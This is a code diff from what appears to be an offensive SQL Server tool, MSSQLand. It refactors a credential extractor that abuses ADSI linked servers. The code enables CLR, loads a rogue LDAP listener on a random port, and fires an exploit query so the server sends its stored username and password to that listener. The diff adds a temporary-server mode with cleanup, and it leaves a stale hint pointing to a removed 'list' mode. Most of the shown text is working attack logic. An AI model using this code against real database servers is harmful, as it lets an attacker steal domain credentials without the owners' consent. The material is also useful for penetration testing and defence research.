@@ -3,41 +3,39 @@ using MSSQLand.Utilities;
 using System;
 using System.Collections.Generic;
 using System.Data;
-using System.Linq;
 using System.Threading.Tasks;
 
 namespace MSSQLand.Actions.Network
 {
     /// <summary>
+    /// Extracts credentials from ADSI linked servers.
     /// https://www.tarlogic.com/blog/linked-servers-adsi-passwords
     /// </summary>
     internal class AdsiCredentialExtractor : BaseAction
     {
-        private enum Mode { List, Self, Link }
+        private enum Mode { Self, Link }
         
-        [ArgumentMetadata(Position = 0, Description = "Mode: list, self, or link (default: list)")]
-        private Mode _mode = Mode.List;
+        [ArgumentMetadata(Position = 0, Description = "Mode: self (create temporary ADSI server) or link <server> (use existing ADSI server)")]
+        private Mode _mode = Mode.Self;
         
-        [ArgumentMetadata(Position = 1, Description = "Target SQL Server name (required for link mode)")]
+        [ArgumentMetadata(Position = 1, Description = "Target ADSI server name (required for link mode)")]
         private string? _targetServer;
 
 
         public override void ValidateArguments(string additionalArguments)
         {
-            string[] parts = SplitArguments(additionalArguments);
-
-            if (parts.Length == 0)
+            if (string.IsNullOrWhiteSpace(additionalArguments))
             {
+                // Default to self mode
+                _mode = Mode.Self;
                 return;
             }
 
+            string[] parts = SplitArguments(additionalArguments);
             string command = parts[0].ToLower();
+
             switch (command)
             {
-                case "list":
-                    _mode = Mode.List;
-                    break;
-
                 case "self":
                     _mode = Mode.Self;
                     break;
@@ -45,14 +43,14 @@ namespace MSSQLand.Actions.Network
                 case "link":
                     if (parts.Length < 2)
                     {
-                        throw new ArgumentException("Missing target SQL Server name. Example: /a:adsi link SQL53");
+                        throw new ArgumentException("Missing target ADSI server name. Example: /a:adsicreds link SQL-ADSI");
                     }
                     _mode = Mode.Link;
                     _targetServer = parts[1];
                     break;
 
                 default:
-                    throw new ArgumentException("Invalid mode. Use 'list', 'self', or 'link <SQLServer>'");
+                    throw new ArgumentException("Invalid mode. Use 'self' or 'link <ServerName>'");
             }
         }
 
@@ -62,30 +60,9 @@ namespace MSSQLand.Actions.Network
         /// </summary>
         public override object? Execute(DatabaseContext databaseContext)
         {
-            if (_mode == Mode.List)
-            {
-                return ListAdsiServers(databaseContext);
-            }
-
             if (_mode == Mode.Self)
             {
-                _targetServer = $"SQL-{Guid.NewGuid().ToString("N").Substring(0, 6)}";
-                AdsiService adsiService = new(databaseContext);
-
-                if (!adsiService.CreateAdsiLinkedServer(_targetServer))
-                {
-                    adsiService.DropLinkedServer(_targetServer);
-                    if (!adsiService.CreateAdsiLinkedServer(_targetServer))
-                    {
-                        return null;
-                    }
-                }
-
-                Tuple<string, string> credentials = ExtractCredentials(databaseContext, _targetServer);
-
-                adsiService.DropLinkedServer(_targetServer);
-
-                return credentials;
+                return ExtractCredentialsSelf(databaseContext);
             }
 
             if (_mode == Mode.Link)
@@ -98,37 +75,57 @@ namespace MSSQLand.Actions.Network
         }
 
         /// <summary>
-        /// Lists ADSI linked servers and returns a list of their names.
+        /// Creates a temporary ADSI server and extracts credentials, then cleans up.
         /// </summary>
-        private List<string>? ListAdsiServers(DatabaseContext databaseContext)
+        private Tuple<string, string> ExtractCredentialsSelf(DatabaseContext databaseContext)
         {
+            _targetServer = $"ADSI-{Guid.NewGuid().ToString("N").Substring(0, 6)}";
+            
+            Logger.Task($"Creating temporary ADSI server '{_targetServer}' for credential extraction");
+            
+            AdsiService adsiService = new(databaseContext);
 
-            string query = "SELECT srvname FROM master..sysservers WHERE srvproduct = 'ADSI'";
-            DataTable result = databaseContext.QueryService.ExecuteTable(query);
-
-            if (result.Rows.Count == 0)
+            // Try to create the ADSI server
+            if (!adsiService.CreateAdsiLinkedServer(_targetServer))
             {
-                Logger.Warning("No ADSI linked servers found.");
-                return null;
+                // If creation failed, try to clean up and retry once
+                Logger.Warning("Initial creation failed. Attempting cleanup and retry...");
+                try
+                {
+                    adsiService.DropLinkedServer(_targetServer);
+                }
+                catch
+                {
+                    // Ignore cleanup errors
+                }
+
+                if (!adsiService.CreateAdsiLinkedServer(_targetServer))
+                {
+                    Logger.Error("Failed to create temporary ADSI server.");
+                    return null;
+                }
             }
 
-            // Convert DataTable to a list of server names
-            List<string> adsiServers = result.AsEnumerable()
-                                             .Select(row => row.Field<string>("srvname"))
-                                             .ToList();
-
-            // Join the server names into a comma-separated string for logging
-            string serverList = string.Join(", ", adsiServers);
-
-            Logger.Success($"Found {adsiServers.Count} ADSI linked servers");
-            Logger.NewLine();
-
-            // Display formatted markdown table
-            Console.WriteLine(MarkdownFormatter.ConvertListToMarkdownTable(adsiServers, "ADSI Servers"));
-
-            return adsiServers;
+            try
+            {
+                // Extract credentials
+                Tuple<string, string> credentials = ExtractCredentials(databaseContext, _targetServer);
+                return credentials;
+            }
+            finally
+            {
+                // Always clean up the temporary server
+                Logger.InfoNested($"Cleaning up temporary ADSI server '{_targetServer}'");
+                try
+                {
+                    adsiService.DropLinkedServer(_targetServer);
+                }
+                catch (Exception ex)
+                {
+                    Logger.Warning($"Failed to cleanup temporary server: {ex.Message}");
+                }
+            }
         }
-
 
         /// <summary>
         /// Extracts credentials using an ADSI provider.
@@ -138,14 +135,17 @@ namespace MSSQLand.Actions.Network
         /// <returns>A tuple containing the username and password.</returns>
         private Tuple<string, string> ExtractCredentials(DatabaseContext databaseContext, string adsiServer)
         {
-            if (!ListAdsiServers(databaseContext).Contains(adsiServer))
+            AdsiService adsiService = new(databaseContext);
+            
+            // Verify the ADSI server exists
+            if (!adsiService.AdsiServerExists(adsiServer))
             {
                 Logger.Error($"ADSI linked server '{adsiServer}' not found.");
+                Logger.InfoNested("Use '/a:adsi list' to see available ADSI servers.");
                 return null;
             }
 
-            Logger.TaskNested($"Extracting credentials using Active Directory Service Interfaces (ADSI) provider");
-
+            Logger.Task($"Extracting credentials using Active Directory Service Interfaces (ADSI) provider");
 
             if (databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1) == false)
             {
@@ -153,16 +153,12 @@ namespace MSSQLand.Actions.Network
                 return null;
             }
 
-
-
-            AdsiService adsiService = new(databaseContext)
-            {
-                Port = Misc.GetRandomUnusedPort()
-            };
+            adsiService.Port = Misc.GetRandomUnusedPort();
 
             Logger.TaskNested($"Targeting linked ADSI server: {adsiServer}");
 
-            try {
+            try
+            {
                 adsiService.LoadLdapServerAssembly();
 
                 Task<DataTable> task = adsiService.ListenForRequest();
@@ -182,11 +178,11 @@ namespace MSSQLand.Actions.Network
                 try
                 {
                     databaseContext.QueryService.ExecuteNonProcessing(exploitQuery);
-                } catch
+                }
+                catch
                 {
                     // Ignore the exception, it is normal to fail
                 }
-
 
                 // Wait for the background task to complete and get the result
                 DataTable ldapResult = task.Result;
@@ -195,7 +191,6 @@ namespace MSSQLand.Actions.Network
                 {
                     string rawCredentials = ldapResult.Rows[0][0].ToString();
                     Logger.Success("Credentials retrieved");
-
 
                     // Split **only at the first occurrence** of `:`
                     int splitIndex = rawCredentials.IndexOf(':');
@@ -212,7 +207,7 @@ namespace MSSQLand.Actions.Network
                     }
                 }
 
-                Console.WriteLine("No results found");
+                Logger.Warning("No credentials found");
                 return null;
             }
             catch (Exception ex)
